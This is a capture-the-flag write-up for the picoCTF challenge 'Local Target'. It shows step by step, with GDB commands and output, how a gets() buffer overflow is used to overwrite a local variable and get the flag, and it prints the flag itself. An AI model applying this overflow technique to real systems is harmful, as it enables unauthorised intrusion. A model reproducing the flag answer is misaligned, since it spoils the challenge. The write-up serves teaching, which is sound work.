## Writeup : Local Target

## Overview
This challenge involves exploiting a buffer overflow vulnerability to manipulate the value of a local variable in order to reveal a flag. The goal is to change the value of the local variable `num` to 65, which will trigger a condition to print the flag.

## Analysis

### Code Overview

The provided code includes a  buffer overflow vulenrability:

```c
gets(input);
printf("\n");
```

The code also has a check to see if `num` equals 65:

```c
 if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
```
### Vulnerability Details
The `gets` function is used to read user input into the `input` buffer. This function is vulnerable because it does not performbounds checking, allowing us to overwrite adjacent memory, including the local variable `num`.

## Exploitation Strategy

1. **Determine Offset**: Use a debugger (such as GDB) to calculate the offset between the buffer and the local variable `num`.
2. **Carft Payload**: Create a payload that overwrites the `num` variable with the value 65.

## Exploitation Steps
1. **Start Debugging**:

```terminal
$ gdb local-target
gef➤  break main
gef➤  run
```
2. **Observe the Execution**:
Use the `next` command(`ni`) to step through the code until you reach the `gets` function call:

```terminal
gef➤  ni
gef➤  ni
...
gef➤  ni 
```
Example output when reaching the `gets` function call:

```terminal
0x401275 <main+63>	call	0x401110 <gets@plt>
```

3. **Input Data**:
When prompted for input, provide a string to observe how it overwites memory:
 

```terminal
gef➤  
AAAAA
```

4. **Check Memory Layout**:
Use the `telescope` command to view the stack and find the address of the buffer:


```terminal
gef➤  tele
0x00007fffffffdd00│+0x0000: 0x0000004141414141 ("AAAAA"?)        ← $rax, $rsp
0x00007fffffffdd08│+0x0008: 0x00007ffff7fe6c40  →  <dl_main+0> push rbp
0x00007fffffffdd10│+0x0010: 0x0000000000000000
0x00007fffffffdd18│+0x0018: 0x00007fff00000040 ("@"?)
0x00007fffffffdd20│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdd28│+0x0028: 0x00007ffff7defc8a  →  <__libc_start_call_main+122> mov edi, eax

```

the address `0x00007fffffffdd00` is where the buffer starts.

5. **Find Local Variable Address**:
Continue stepping through the code to reach the comparison (`cmp`) instruction:

```terminal
gef➤  ni
gef➤  ni
...
gef➤  ni 
```
Example output when reaching the `cmp` instruction:
```terminal
0x4012a9 <main+115>       cmp    DWORD PTR [rbp-0x8], 0x41
```

This corresponds to:

```c
if( num == 65 )
```

`[rbp-0x8]` indicates that the address of `num` is 8 bytes below `rbp`.

Check the exact address of `num`:

```terminal
gef➤  x/wx $rbp-0x8
0x7fffffffdd18: 0x00000040
```
The address `0x7fffffffdd18` contains the value `0x40` (64 in decimal), which is the initial value of `num`.

6. **Calculate Offset**:
Compute the offset between the buffer and `num`:

```terminal
$ python            
Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffdd18-0x00007fffffffdd00
24
```

The offset is 24 bytes.

7. **Craft Payload**:
Construct payload to overwrite `num` with 65. Input 24 characters followed by `A` (which has a decimal value of 65):

```terminal
$ nc saturn.picoctf.net 49575
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```

## Conclusion
By exploiting the buffer overflow vulnerability, you can overwrite the local variable `num` with the value 65. This allows you to pass the condition check and reveal the flag.
